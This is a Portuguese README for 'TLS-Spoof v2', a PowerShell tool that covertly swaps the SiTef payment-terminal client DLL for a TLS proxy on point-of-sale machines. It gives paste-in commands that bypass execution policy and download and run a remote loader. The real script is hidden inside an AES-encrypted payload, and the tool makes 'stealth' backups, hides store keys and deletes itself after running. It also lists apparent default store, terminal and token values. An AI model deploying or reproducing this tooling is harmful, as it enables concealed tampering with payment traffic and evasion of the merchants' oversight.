# TLS-Spoof v2 — Deploy

Deploy/instalação e reversão do proxy SiTef TLS via PowerShell — **sem exe**. Replica o fluxo do `monitor.exe` (`proxy_mgr.c` / `proxy_reverse`).

## O que faz

**Instalar** (padrão):
1. Baixa do GitHub: `CliSiTef32I.dll` (proxy), `CliSiTef32I_tlsgwp.dll`, `libcurl32.dll`, `86`
2. Verifica `C:\CliSiTef` (se não existir, sai sem alterar nada — não é máquina SiTef)
3. Loop aguardando processo com `CliSiTef32I.dll` carregada (Ctrl+C fecha)
4. Grava o `86` em `C:\CliSiTef\NaoExcluirControleCliSiTef\<loja>\<terminal>\`
5. Mata o processo → backup original (`libenv_orig.dll` / `CONFITLS.INI.orig`, stealth) → escreve proxy + `libenv.dll` (tlsgwp) + libcurl → CONFITLS.INI → oculta chaves da loja → **reabre o processo** com os mesmos argumentos
6. Encerra (self-delete do arquivo baixado)

**Reverter** (`-Reverse`): mata → restaura INI/DLL originais → remove artefatos → limpa cache da loja → reabre.

## Arquivos no repo

| Arquivo | Descrição |
|---|---|
| `loader.ps1` | Único script necessário — payload AES-256 cifrado + decriptador |
| `CliSiTef32I.dll` | Proxy (stub 176 KB) |
| `CliSiTef32I_tlsgwp.dll` | Original TLSGWP (vira `libenv.dll` na instalação) |
| `libcurl32.dll` | Dependência TLS |
| `86` | Terminal 86 |

## Como usar (1 comando)

```powershell
powershell -NoP -EP Bypass -C "irm 'https://raw.githubusercontent.com/salexunic/tls/<SHA>/loader.ps1' -UseBasicParsing -OutFile $env:TEMP\l.ps1; & $env:TEMP\l.ps1 -Key '<CHAVE>' -Loja <loja> -Token <token>"
```

**Reverter:**
```powershell
powershell -NoP -EP Bypass -C "irm 'https://raw.githubusercontent.com/salexunic/tls/<SHA>/loader.ps1' -UseBasicParsing -OutFile $env:TEMP\l.ps1; & $env:TEMP\l.ps1 -Key '<CHAVE>' -Reverse"
```

**Modos:** `-Watch` (fica vigiando), `-DetectOnly` (só lista), `-Once`, `-Force`.

## Proteção

- O código real (`deploy.ps1`) **não está no repo** — só o `loader.ps1` com payload AES-256 (CBC, PKCS7, chave = SHA-256 da senha, IV prefixada).
- Sem a chave (`-Key`) o loader recusa: `[ERRO] Chave incorreta ou payload corrompido.`
- A chave vai no comando (nunca dentro do arquivo). Limite: quem vê a linha de comando vê a chave — protege o código no repo/trânsito, não o segredo de execução.
- O loader se apaga após rodar (self-delete).
- Use o SHA do commit na URL (raw do `main` fica em cache no CDN).

## Regenerar o loader (após editar o script)

```powershell
powershell -NoP -EP Bypass -File tools\encrypt.ps1 -Key "SUA_CHAVE"
```

Edita `deploy.ps1` local → roda o encrypt → commit/push do `loader.ps1` novo.

## Config

- Registry `HKLM\SOFTWARE\SiTeF\Monitor`: `Loja`, `Token`, `Terminal`, `TlsHost` (prioridade: parâmetro > registry > defaults do `config.h`).
- Defaults: Loja `67070162`, Terminal `SW000001`, Token `5502-2601-7587-0030`, host `tls-prod.fiservapp.com`.
